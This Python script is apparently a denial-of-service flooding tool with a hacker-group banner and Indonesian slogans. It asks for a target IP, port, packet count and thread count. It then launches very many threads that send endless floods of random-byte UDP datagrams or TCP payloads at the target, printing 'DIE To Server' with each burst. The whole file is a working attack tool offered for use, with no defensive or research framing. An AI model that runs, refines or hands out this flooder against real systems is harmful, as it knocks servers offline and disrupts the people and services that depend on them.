import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os, socket, threading, colorsys, time, random
import socket
import sys
import os
import time
import random
import threading
import base64 as b64
from types import MethodType
import string
import json
import sys
os.system("clear")

print("""
\033
░░░░░░░░░░░░░░░░░░░
██░░░░██░██╔██████░░░
██╗░░░██╗██║██░░░██░░░
██║░░░██║██║██╔══██░░░
╚██╗░██╔╝██║██████░░░
░╚████╔╝░██║██╔══╝░░
░░╚██╔╝░░██║██║░░░░░
░░░╚═╝░░░╚═╝╚═╝░░░░░
""")
print("""\033 KAMI ADALAH GREEN TIM """)

print("\033[31m━━━ Ready? (y/n)")
choice = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Packet")    
print("\033[31m━━━ Min Packet 99000")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 9999999")
threads = int(input("┗━>\033[0m:"))
def xxxxxx():
  data = random._urandom(1079)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> DIE To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] LIFE TO WORLD")


def xxxxx():
  data = random._urandom(1029)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> DIE To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] LIFE TO WORLD")

def xxxx():
  data = random._urandom(1107)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> DIE To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] KAMI DI MANA MANA")

def xxx():
  data = random._urandom(3161)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====> DIE To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] KAMI DI MANA MANA")

def xx():
  data = random._urandom(1016)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====>DIE To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] KAMI DI MANA MANA")

def x():
  data = random._urandom(1894)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[91m}=====>DIE To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] KAMI DI MANA MANA")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxxxx)
    th.start()
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
  else:
    th = threading.Thread(target = xxx)
    th.start()
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()